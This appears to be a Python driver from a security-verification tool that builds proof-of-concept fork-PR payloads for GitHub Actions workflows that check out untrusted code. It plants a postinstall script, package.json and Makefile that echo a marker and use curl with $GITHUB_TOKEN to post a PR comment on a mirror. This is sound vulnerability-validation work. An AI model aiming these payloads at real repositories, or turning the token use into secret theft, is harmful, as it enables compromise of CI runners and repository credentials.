"""Driver for `checkout-untrusted` findings.

Fork the mirror, plant a `postinstall` (or Makefile / setup.py) on a
payload branch that writes a marker file and posts a `GITHUB_TOKEN`
comment, then open a PR from the fork against the mirror.
"""
from __future__ import annotations

from typing import Any

from ..attacker import PayloadFile
from .base import (
    Driver,
    DriverPreviewInfo,
    PayloadArtifact,
    SignalSpec,
    TriggerPlan,
    register,
)


def _postinstall_shell(marker: str) -> str:
    return (
        "#!/usr/bin/env bash\n"
        "set -e\n"
        f"echo GRAFTER_MARKER_{marker}\n"
        f"echo hostname=$(hostname 2>/dev/null||true) whoami=$(whoami 2>/dev/null||true) uuid={marker}\n"
        "if [ -n \"$GITHUB_TOKEN\" ] && [ -n \"$GITHUB_API_URL\" ] && [ -n \"$GITHUB_REPOSITORY\" ]; then\n"
        "  ISSUE_OR_PR=$(cat $GITHUB_EVENT_PATH 2>/dev/null | python -c 'import json,sys;j=json.load(sys.stdin);print(j.get(\"pull_request\",{}).get(\"number\") or j.get(\"issue\",{}).get(\"number\") or \"\")' 2>/dev/null)\n"
        "  if [ -n \"$ISSUE_OR_PR\" ]; then\n"
        "    curl -sS -X POST -H \"Authorization: Bearer $GITHUB_TOKEN\" "
        "-H \"Accept: application/vnd.github+json\" "
        "\"$GITHUB_API_URL/repos/$GITHUB_REPOSITORY/issues/$ISSUE_OR_PR/comments\" "
        f"-d '{{\"body\":\"grafter-poc side-effect GRAFTER_SIDE_EFFECT_{marker}\"}}' >/dev/null || true\n"
        "  fi\n"
        "fi\n"
    )


def _package_json(marker: str) -> str:
    return (
        '{\n'
        '  "name": "grafter-poc-payload",\n'
        '  "version": "0.0.1",\n'
        '  "private": true,\n'
        '  "scripts": {\n'
        '    "postinstall": "bash grafter_poc_postinstall.sh"\n'
        '  }\n'
        '}\n'
    )


def _makefile(marker: str) -> str:
    return (
        ".PHONY: build test install all\n"
        "build test install all:\n"
        f"\t@bash grafter_poc_postinstall.sh\n"
    )


class CheckoutUntrustedDriver(Driver):
    category = "checkout-untrusted"
    default_impact_tags = ["rce", "secrets_exposure"]

    def preview(self, finding: dict, marker: str) -> DriverPreviewInfo:
        sink = (finding or {}).get("detected_sink_line") or "post-checkout build/install step"
        signals = [
            SignalSpec(
                id="marker_in_log",
                signal_type="run_log_regex",
                tags=["rce"],
                description=f"workflow run log contains `GRAFTER_MARKER_{marker}`",
                params={"regex": f"GRAFTER_MARKER_{marker}"},
            ),
            SignalSpec(
                id="side_effect_comment",
                signal_type="pr_comment_by_gh_token_regex",
                tags=["rce", "metadata_write"],
                description=(
                    "a PR comment authored by the base-repo GITHUB_TOKEN identity "
                    f"starts with `GRAFTER_SIDE_EFFECT_{marker}`"
                ),
                params={"regex": f"GRAFTER_SIDE_EFFECT_{marker}"},
            ),
        ]
        return DriverPreviewInfo(
            claim=(
                "An anonymous fork-PR contributor can execute shell in the "
                f"base repo's runner via `{sink[:120]}` and reach "
                "`GITHUB_TOKEN`."
            ),
            impact_tags=list(self.default_impact_tags),
            signals=signals,
            success_requirement="marker_in_log AND side_effect_comment",
            payload_summary=(
                "Plant `grafter_poc_postinstall.sh` + `package.json` + "
                "`Makefile` on the attacker fork branch. `package.json` has a "
                "`postinstall` script; `Makefile`'s default targets invoke the "
                "same script. When the vulnerable workflow runs `npm install`, "
                "`make`, or an equivalent build/install step after checking "
                "out the attacker's HEAD, the script echoes the marker and "
                "posts a comment via `$GITHUB_TOKEN`."
            ),
            supports_real_repo_mode=False,
        )

    def build_payload(self, finding: dict, marker: str) -> PayloadArtifact:
        return PayloadArtifact(
            files=[
                PayloadFile(path="grafter_poc_postinstall.sh", content=_postinstall_shell(marker).encode("utf-8")),
                PayloadFile(path="package.json", content=_package_json(marker).encode("utf-8")),
                PayloadFile(path="Makefile", content=_makefile(marker).encode("utf-8")),
            ],
            commit_message=f"grafter-poc payload {marker}",
        )

    def build_trigger(self, finding: dict, marker: str) -> TriggerPlan:
        return TriggerPlan(
            kind="pr",
            branch=f"grafter-poc-{marker}",
            base_branch="main",  # orchestrator overrides with mirror default branch
            title=f"Grafter Live PoC {marker}",
            body=(
                "Grafter Live PoC. Fork-PR whose payload branch plants a "
                "benign postinstall / Makefile that echoes the marker and "
                "posts a `$GITHUB_TOKEN` comment."
            ),
        )


register(CheckoutUntrustedDriver())
